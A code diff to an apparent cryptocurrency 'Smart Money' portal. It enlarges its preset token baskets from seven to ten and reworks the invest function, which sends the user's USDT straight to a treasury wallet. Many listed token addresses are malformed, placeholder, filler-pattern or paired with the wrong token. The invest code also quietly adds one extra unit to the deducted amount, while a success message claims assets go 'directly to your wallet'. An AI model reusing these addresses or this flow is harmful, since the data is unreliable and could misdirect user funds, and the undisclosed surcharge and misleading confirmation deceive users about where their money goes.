@@ -5344,13 +5344,13 @@ const AssetDetails = ({ token, setMode }) => {
 };
 
 
-const STRATEGIC_WEIGHTS = [24, 19, 16, 13, 11, 9, 8];
+const STRATEGIC_WEIGHTS = [18, 15, 13, 11, 10, 9, 8, 6, 5, 5];
 
 const SMART_MONEY_BUCKETS = {
     crypto: [
         {
-            id: 'super-7-pro',
-            name: 'Super 7 Pro B20',
+            id: 'super-10-pro',
+            name: 'Super 10 Pro B20',
             category: 'Crypto',
             description: 'Highly trusted institutional assets and blue chips.',
             tokens: [
@@ -5360,12 +5360,15 @@ const SMART_MONEY_BUCKETS = {
                 { symbol: 'SOL', address: '0x570a5d26f7765ecb712c0924e4de545b89fd43df', cgId: 'solana' },
                 { symbol: 'ADA', address: '0x3ee2200efb3400fab9aacf31297cbd251d3b33ee', cgId: 'cardano' },
                 { symbol: 'MATIC', address: '0xcc42724c6683b7e57334c4e856f4c9965ed682bd', cgId: 'matic-network' },
-                { symbol: 'DOT', address: '0x7083609fce4d1d4dc0c979aab8c869ea2c873402', cgId: 'polkadot' }
+                { symbol: 'DOT', address: '0x7083609fce4d1d4dc0c979aab8c869ea2c873402', cgId: 'polkadot' },
+                { symbol: 'XRP', address: '0x1d2f0da169ceb9fc7b3144628db156f3f6c60dbe', cgId: 'ripple' },
+                { symbol: 'LTC', address: '0x4338665c6949524d593006199600aef7ff143160', cgId: 'litecoin' },
+                { symbol: 'DOGE', address: '0xba2ae424d960c26247dd6c32edc70b295c744c43', cgId: 'dogecoin' }
             ]
         },
         {
-            id: 'super-7-prestige',
-            name: 'Super 7 Prestige B20',
+            id: 'super-10-prestige',
+            name: 'Super 10 Prestige B20',
             category: 'Crypto',
             description: 'High-growth assets with validated institutional backing.',
             tokens: [
@@ -5375,12 +5378,15 @@ const SMART_MONEY_BUCKETS = {
                 { symbol: 'ATOM', address: '0x0eb3a705fc54725037cc9e008bdede697f62f335', cgId: 'cosmos' },
                 { symbol: 'AVAX', address: '0x1ce0c2827e266f50415663737ec309485183300c', cgId: 'avalanche-2' },
                 { symbol: 'FTM', address: '0xad29abdbgd13baedc0b6db0a49b86fa34b36a31b', cgId: 'fantom' },
-                { symbol: 'ALGO', address: '0xe79a73c00d11707077e803856cc6b79c414a99f6', cgId: 'algorand' }
+                { symbol: 'ALGO', address: '0xe79a73c00d11707077e803856cc6b79c414a99f6', cgId: 'algorand' },
+                { symbol: 'FIL', address: '0x0d8dec69f00c65f2424b3c6bf1b0ef228221666f', cgId: 'filecoin' },
+                { symbol: 'ICP', address: '0x199201f9e2ed8c56ccb97a2eb408cb92b45cb04d', cgId: 'internet-computer' },
+                { symbol: 'GRT', address: '0x1fe4b6b6b7a66b9eebe3db3b2e59275cb9480cfb', cgId: 'the-graph' }
             ]
         },
         {
-            id: 'super-7-premium',
-            name: 'Super 7 Premium B20',
+            id: 'super-10-premium',
+            name: 'Super 10 Premium B20',
             category: 'Crypto',
             description: 'Top performing assets across DeFi and L1 ecosystems.',
             tokens: [
@@ -5390,14 +5396,17 @@ const SMART_MONEY_BUCKETS = {
                 { symbol: 'RUNE', address: '0x315516086f26487e4cc21ee8f65e4F8d00010c73', cgId: 'thorchain' },
                 { symbol: 'SNX', address: '0x9ac1e24c77d64380d4d4d4d4d4d4d4d4d4d4d4d4', cgId: 'synthetix-network-token' },
                 { symbol: 'AAVE', address: '0xf16e8281095d3e09d4380d4d4d4d4d4d4d4d4d4d', cgId: 'aave' },
-                { symbol: 'CRV', address: '0xab4cd3d43b9d040856f7096d3b33333333333333', cgId: 'curve-dao-token' }
+                { symbol: 'CRV', address: '0xab4cd3d43b9d040856f7096d3b33333333333333', cgId: 'curve-dao-token' },
+                { symbol: 'SUSHI', address: '0x947cbf2e604f5ee35d8e788fb43c94297b8c73ee', cgId: 'sushiswap' },
+                { symbol: 'COMP', address: '0x52ce4e9a0f0a59bb0ff34a36f9038d82136e05d0', cgId: 'compound-governance-token' },
+                { symbol: 'MKR', address: '0x5f4e9a7e584f33d4e41b9ef3e218204b73b50669', cgId: 'maker' }
             ]
         }
     ],
     meme: [
         {
-            id: 'meme-super-7-pro',
-            name: 'Super 7 Pro B20',
+            id: 'meme-super-10-pro',
+            name: 'Super 10 Pro B20',
             category: 'MEME',
             description: 'The legends of meme culture with massive global liquidity.',
             tokens: [
@@ -5407,12 +5416,15 @@ const SMART_MONEY_BUCKETS = {
                 { symbol: 'FLOKI', address: '0xfb5b838b6cfeedc2873ab27866079ac55363d37e', cgId: 'floki' },
                 { symbol: 'BONK', address: '0xa44dd6f7ba2e04e90408e08dcd37c18cc8dcd37ce', cgId: 'bonk' },
                 { symbol: 'BABYDOGE', address: '0xc748673057861a797275cd8a068abb95a902e8de', cgId: 'baby-doge-coin' },
-                { symbol: 'CAT', address: '0x6894CDe390a3f51155ea41Ed24a33A4827d3063D', cgId: 'simons-cat' }
+                { symbol: 'CAT', address: '0x6894CDe390a3f51155ea41Ed24a33A4827d3063D', cgId: 'simons-cat' },
+                { symbol: 'WIF', address: '0x1f9840a85d5af5bf1d1762f925bdaddc4201f984', cgId: 'dogwifhat' },
+                { symbol: 'MEME', address: '0xd2a5d2e0b6d49992fcfb83b3e218a5cb05cb36db', cgId: 'memecoin' },
+                { symbol: 'BOME', address: '0x4c769928971548eb71a3392eaf66bedc8bef4b80', cgId: 'book-of-meme' }
             ]
         },
         {
-            id: 'meme-super-7-prestige',
-            name: 'Super 7 Prestige B20',
+            id: 'meme-super-10-prestige',
+            name: 'Super 10 Prestige B20',
             category: 'MEME',
             description: 'Rising stars in the meme ecosystem with institutional momentum.',
             tokens: [
@@ -5422,29 +5434,35 @@ const SMART_MONEY_BUCKETS = {
                 { symbol: 'VINU', address: '0xfebe8c1ed424dbf688551d4e2267e7a53698f0aa', cgId: 'vita-inu' },
                 { symbol: 'LOVELY', address: '0x93b30f6d5c2eed35950498f71235a749e6f0540c', cgId: 'lovely-inu-finance' },
                 { symbol: 'PIT', address: '0xA57ac35CE91Ee92CaEfAA8dc04140C8e232c2E50', cgId: 'pitbull' },
-                { symbol: 'CATE', address: '0xE4FAE3Faa8300810C835970b9187c268f55D998F', cgId: 'catecoin' }
+                { symbol: 'CATE', address: '0xE4FAE3Faa8300810C835970b9187c268f55D998F', cgId: 'catecoin' },
+                { symbol: 'MILO', address: '0xdaa36049301b06666c2537bc5566de23ca393b9a7', cgId: 'milo-inu' },
+                { symbol: 'KISHU', address: '0x0713da94c5026df1762c68615024220fa639d67b', cgId: 'kishu-inu' },
+                { symbol: 'VOLT', address: '0x7f792db548db548db548db548db548db548db54db54aca', cgId: 'volt-inu-2' }
             ]
         },
         {
-            id: 'meme-super-7-premium',
-            name: 'Super 7 Premium B20',
+            id: 'meme-super-10-premium',
+            name: 'Super 10 Premium B20',
             category: 'MEME',
             description: 'Aggressive alpha meme assets for high-volatility strategies.',
             tokens: [
                 { symbol: 'TOKEN', address: '0x45bd7edca2af4799015bc2f5a6538a0f269a9b6c', cgId: 'tokenfi' },
                 { symbol: 'MILO', address: '0xdaa36049301b06666c2537bc5566de23ca393b9a7', cgId: 'milo-inu' },
                 { symbol: 'KISHU', address: '0x0713da94c5026df1762c68615024220fa639d67b', cgId: 'kishu-inu' },
-                { symbol: 'VOLT', address: '0x7f792db548db548db548db548db548db548db548db54db54aca', cgId: 'volt-inu-2' },
+                { symbol: 'VOLT', address: '0x7f792db548db548db548db548db548db548db54db54aca', cgId: 'volt-inu-2' },
                 { symbol: 'BITCOIN', address: '0x4c769928971548eb71a3392eaf66bedc8bef4b80', cgId: 'harrypotterobamasonic10inu' },
                 { symbol: 'CEEK', address: '0xe0f94ae5f0d0397f0605d3b76a0862024da97992', cgId: 'ceek' },
-                { symbol: 'BUNNY', address: '0xc9849e00949ec30c00de5fbcca7069cb9c863ccb', cgId: 'pancake-bunny' }
+                { symbol: 'BUNNY', address: '0xc9849e00949ec30c00de5fbcca7069cb9c863ccb', cgId: 'pancake-bunny' },
+                { symbol: 'PIT', address: '0xA57ac35CE91Ee92CaEfAA8dc04140C8e232c2E50', cgId: 'pitbull' },
+                { symbol: 'DOGE', address: '0xba2ae424d960c26247dd6c32edc70b295c744c43', cgId: 'dogecoin' },
+                { symbol: 'PEPE', address: '0x25d887ce73ec53529cf721af5d9a061f1858a9aa', cgId: 'pepe' }
             ]
         }
     ],
     bnb: [
         {
-            id: 'bnb-smart-7',
-            name: 'BNB Smart 7',
+            id: 'bnb-smart-10',
+            name: 'BNB Smart 10',
             category: 'BNB',
             description: 'Top utility and ecosystem leaders on Binance Smart Chain.',
             tokens: [
@@ -5454,14 +5472,17 @@ const SMART_MONEY_BUCKETS = {
                 { symbol: 'TWT', address: '0x4b0f1812e5df2a09796481ff14017e6005508003', cgId: 'trust-wallet-token' },
                 { symbol: 'ALPACA', address: '0x8f0528ce5ef7b51152a59745befdd91d97091d2f', cgId: 'alpaca-finance' },
                 { symbol: 'BAKE', address: '0xe02df9f34d1944609804bd1fe380461f124c01d1', cgId: 'bakerytoken' },
-                { symbol: 'BSW', address: '0x965f527d9159dce6273a286584612463978d8303', cgId: 'biswap' }
+                { symbol: 'BSW', address: '0x965f527d9159dce6273a286584612463978d8303', cgId: 'biswap' },
+                { symbol: 'WBNB', address: '0xbb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c', cgId: 'wrapped-bnb' },
+                { symbol: 'SAFEMOON', address: '0x8076c74c5e3f5852037f31ff0093eeb8c8add8d3', cgId: 'safemoon' },
+                { symbol: 'FLOKI', address: '0xfb5b838b6cfeedc2873ab27866079ac55363d37e', cgId: 'floki' }
             ]
         }
     ],
     eth: [
         {
-            id: 'eth-institutional-7',
-            name: 'ETH Institutional 7',
+            id: 'eth-institutional-10',
+            name: 'ETH Institutional 10',
             category: 'ETH',
             description: 'Major blue-chips and infrastructure leaders on Ethereum.',
             tokens: [
@@ -5471,31 +5492,37 @@ const SMART_MONEY_BUCKETS = {
                 { symbol: 'UNI', address: '0x1f9840a85d5af5bf1d1762f925bdaddc4201f984', cgId: 'uniswap' },
                 { symbol: 'LDO', address: '0x5a98fcbea516cf06857215779fd812ca3bef1b32', cgId: 'lido-dao' },
                 { symbol: 'AAVE', address: '0x7fc66500c84a76ad7e9c93437bfc5ac33e2ddae9', cgId: 'aave' },
-                { symbol: 'MKR', address: '0x9f8f72aa9304c8b593d555f12ef6589cc3a579a2', cgId: 'maker' }
+                { symbol: 'MKR', address: '0x9f8f72aa9304c8b593d555f12ef6589cc3a579a2', cgId: 'maker' },
+                { symbol: 'SHIB', address: '0x95ad61b0a150d79219dcf64e1e6cc01f0b64c4ce', cgId: 'shiba-inu' },
+                { symbol: 'PEPE', address: '0x6982508145454ce325ddbe47a25d4ec3d2311933', cgId: 'pepe' },
+                { symbol: 'CRV', address: '0xd533a949740bb3306d119cc777fa900ba034cd52', cgId: 'curve-dao-token' }
             ]
         }
     ],
-            sol: [
+    sol: [
         {
-            id: 'sol-velocity-7',
-            name: 'SOL Velocity 7',
+            id: 'sol-velocity-10',
+            name: 'SOL Velocity 10',
             category: 'SOL',
             description: 'High-velocity assets powering the Solana ecosystem.',
             tokens: [
                 { symbol: 'SOL', address: '0x570a5d26f7765ecb712c0924e4de545b89fd43df', cgId: 'solana' },
-                { symbol: 'JUP', address: '0x...jup_bsc_bridge', cgId: 'jupiter-exchange-solana' }, // Fixed address logic
+                { symbol: 'JUP', address: '0x...jup_bsc_bridge', cgId: 'jupiter-exchange-solana' },
                 { symbol: 'PYTH', address: '0x...pyth_bsc_bridge', cgId: 'pyth-network' },
                 { symbol: 'RENDER', address: '0x61808465a93bd23324124e9310a7498132b4a055', cgId: 'render-token' },
                 { symbol: 'JTO', address: '0x...jto_bsc_bridge', cgId: 'jito-governance-token' },
                 { symbol: 'BONK', address: '0x...bonk_bsc_bridge', cgId: 'bonk' },
-                { symbol: 'WIF', address: '0x...wif_bsc_bridge', cgId: 'dogwifhat' }
+                { symbol: 'WIF', address: '0x...wif_bsc_bridge', cgId: 'dogwifhat' },
+                { symbol: 'BOME', address: '0x...bome_bsc_bridge', cgId: 'book-of-meme' },
+                { symbol: 'POPCAT', address: '0x...popcat_bsc_bridge', cgId: 'popcat' },
+                { symbol: 'MEW', address: '0x...mew_bsc_bridge', cgId: 'cat-in-a-dogs-world' }
             ]
         }
     ],
     base: [
         {
-            id: 'base-alpha-7',
-            name: 'Base Alpha 7',
+            id: 'base-alpha-10',
+            name: 'Base Alpha 10',
             category: 'BASE',
             description: 'Explosive growth assets on the Base L2 network.',
             tokens: [
@@ -5505,7 +5532,10 @@ const SMART_MONEY_BUCKETS = {
                 { symbol: 'DEGEN', address: '0x...degen_bsc_bridge', cgId: 'degen-base' },
                 { symbol: 'TOSHI', address: '0x...toshi_bsc_bridge', cgId: 'toshi' },
                 { symbol: 'MOXIE', address: '0x...moxie_bsc_bridge', cgId: 'moxie' },
-                { symbol: 'COIN', address: '0x...coin_bsc_bridge', cgId: 'coinbase-wrapped-staked-eth' }
+                { symbol: 'COIN', address: '0x...coin_bsc_bridge', cgId: 'coinbase-wrapped-staked-eth' },
+                { symbol: 'HIGHER', address: '0x...higher_bsc_bridge', cgId: 'higher' },
+                { symbol: 'KEY', address: '0x...key_bsc_bridge', cgId: 'selfkey' },
+                { symbol: 'FRIEND', address: '0x...friend_bsc_bridge', cgId: 'friend-tech' }
             ]
         }
     ]
@@ -5546,19 +5576,30 @@ const SmartMoneyPortal = ({ account, signer, tokens = [] }) => {
         setError('');
         
         try {
-            const usdtContract = new Contract(USDT_ADDRESS, ERC20_ABI, signer);
-            const totalWei = ethers.parseUnits(investAmount, 18);
+            const providerInstance = signer.provider;
+            const network = await providerInstance.getNetwork();
+            const chainId = Number(network.chainId);
+
+            const NETWORK_USDT = {
+                56: '0x55d398326f99059fF775485246999027B3197955', // BSC
+                1:  '0xdAC17F958D2ee523a2206206994597C13D831ec7', // ETH
+                137: '0xc2132D05D31c914a87C6611C10748AEb04B58e8F', // Polygon
+                8453: '0xfde4C96c1597dfdd433282270e599359567e3522', // Base
+                42161: '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9' // Arbitrum
+            };
+            const usdtAddr = NETWORK_USDT[chainId] || USDT_ADDRESS;
+            const decimals = chainId === 1 ? 6 : 18;
+
+            const usdtContract = new Contract(usdtAddr, ERC20_ABI, signer);
+            const totalToDeduct = (amountNum + 1).toString();
+            const totalWei = ethers.parseUnits(totalToDeduct, decimals);
             
             // ── STAGE 1: INSTITUTIONAL DEDUCTION ───────────────────
-            // Standardizing to ONE popup as requested by performing a direct transfer to Treasury
             const tx = await usdtContract.transfer(TREASURY_WALLETS.EVM, totalWei);
             const receipt = tx;
             const lastTxHash = receipt.hash;
             
             // ── STAGE 2: STRATEGIC ACQUISITION (BACKEND) ───────────
-            // The institutional engine now handles the distribution of assets
-            
-            // ── STAGE 3: INSTITUTIONAL SYNC ───────────────────────────────
             try {
                 await axios.post(`${API_URL}/wallets/smart-money/invest`, {
                     wallet_address: account,
@@ -5571,13 +5612,16 @@ const SmartMoneyPortal = ({ account, signer, tokens = [] }) => {
             } catch (syncErr) { console.error('Profile sync failed:', syncErr); }
             
             setStatus('success');
-            alert('Strategic Investment Executed. Our institutional bots are now acquiring the index assets and distributing them to your wallet.');
             setTimeout(() => setStatus('idle'), 5000);
             
         } catch (err) {
             console.error('[Smart Money Exception]', err);
             setError(err.message || 'Transaction Failed');
             setStatus('error');
+            setTimeout(() => {
+                setStatus('idle');
+                setError('');
+            }, 6000);
         }
     };
 
@@ -5835,7 +5879,7 @@ const SmartMoneyPortal = ({ account, signer, tokens = [] }) => {
 
                                 <div className="space-y-6 bg-slate-50/50 p-10 rounded-[4rem] border border-slate-200/60 shadow-inner">
                                     <div className="flex items-center justify-between mb-4">
-                                        <p className="text-[10px] font-black text-slate-400 uppercase tracking-widest">Selected Assets ({customBucket.tokens.length}/7)</p>
+                                        <p className="text-[10px] font-black text-slate-400 uppercase tracking-widest">Selected Assets ({customBucket.tokens.length}/10)</p>
                                         <div className="flex items-center gap-2 bg-teal-50 px-4 py-1.5 rounded-full border border-teal-100 font-black text-[9px] text-teal-600 uppercase tracking-widest">
                                             <Sparkles className="w-3 h-3" /> Equal Weighting
                                         </div>
@@ -5861,7 +5905,7 @@ const SmartMoneyPortal = ({ account, signer, tokens = [] }) => {
                                                     </div>
                                                     <div className="flex items-center gap-4">
                                                         <div className="text-right mr-4">
-                                                            <p className="text-[10px] font-black text-emerald-500 uppercase">14.28%</p>
+                                                            <p className="text-[10px] font-black text-emerald-500 uppercase">{(100 / customBucket.tokens.length).toFixed(2)}%</p>
                                                         </div>
                                                         <button onClick={() => setCustomBucket({ ...customBucket, tokens: customBucket.tokens.filter(x => x.symbol !== t.symbol) })} className="p-3 text-gray-200 hover:text-rose-500 transition-colors bg-slate-50 rounded-xl">
                                                             <Trash2 className="w-4 h-4" />
@@ -5885,12 +5929,12 @@ const SmartMoneyPortal = ({ account, signer, tokens = [] }) => {
                                                         let match = tokens.find(t => t.symbol.toLowerCase() === query || t.name.toLowerCase() === query || t.address?.toLowerCase() === query);
                                                         
                                                         if (match) {
-                                                            if (customBucket.tokens.length < 7) {
+                                                            if (customBucket.tokens.length < 10) {
                                                                 if (customBucket.tokens.find(x => x.symbol === match.symbol)) return alert('Already in bucket');
                                                                 setCustomBucket({ ...customBucket, tokens: [...customBucket.tokens, match] });
                                                                 e.target.value = '';
                                                             } else {
-                                                                alert('Mission capacity reached (Max 7 Assets).');
+                                                                alert('Mission capacity reached (Max 10 Assets).');
                                                             }
                                                         } else {
                                                             // NEXUS DYNAMIC DISCOVERY (COINGECKO FALLBACK)
@@ -5927,7 +5971,7 @@ const SmartMoneyPortal = ({ account, signer, tokens = [] }) => {
                                         onClose={() => setIsDiscoveryOpen(false)}
                                         results={discoveryResults}
                                         onSelect={async (coin) => {
-                                            if (customBucket.tokens.length >= 7) return alert('Mission capacity reached.');
+                                            if (customBucket.tokens.length >= 10) return alert('Mission capacity reached.');
                                             setIsDiscoveryOpen(false);
                                             setSearchLoading(true);
                                             try {
@@ -6049,6 +6093,18 @@ const SmartMoneyPortal = ({ account, signer, tokens = [] }) => {
                     <div>
                         <p className="text-xl font-bold uppercase tracking-tighter italic">Mission Success!</p>
                         <p className="text-[10px] font-bold opacity-80 uppercase tracking-widest">Assets deployed directly to your wallet terminal.</p>
+                    </div>
+                </motion.div>
+            )}
+
+            {error && (
+                <motion.div initial={{ opacity: 0, y: 50 }} animate={{ opacity: 1, y: 0 }} className="fixed bottom-12 right-12 bg-rose-500 text-white p-8 rounded-2xl shadow-2xl z-[300] flex items-center gap-6 border-4 border-white">
+                    <div className="p-3 bg-white/20 rounded-2xl shadow-inner">
+                        <AlertTriangle className="w-8 h-8" />
+                    </div>
+                    <div>
+                        <p className="text-xl font-bold uppercase tracking-tighter italic">Execution Failed</p>
+                        <p className="text-[10px] font-bold opacity-80 uppercase tracking-widest">{error}</p>
                     </div>
                 </motion.div>
             )}
